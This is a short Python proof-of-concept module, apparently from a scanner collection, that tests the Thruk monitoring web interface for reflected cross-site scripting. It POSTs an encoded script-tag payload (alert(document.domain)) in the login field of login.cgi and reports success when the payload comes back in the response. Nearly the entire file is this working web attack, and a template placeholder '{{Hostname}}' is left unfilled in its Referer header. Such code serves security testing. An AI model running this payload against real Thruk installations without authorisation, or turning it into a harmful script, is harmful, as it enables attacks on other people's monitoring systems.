import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Thruk Monitoring Webinterface - XSS''',
        "description": '''''',
        "severity": "medium",
        "references": [
            "https://www.thruk.org/download.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["xss", "thruk"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/thruk/cgi-bin/login.cgi"""
        method = "POST"
        data = """referer=%2Fthruk&login=--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=Thruk+Monitoring+Webinterface"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{{Hostname}}/thruk/cgi-bin/login.cgi?thruk'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""</script><script>alert(document.domain)</script>""" in resp0.text) and ("""text/html""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url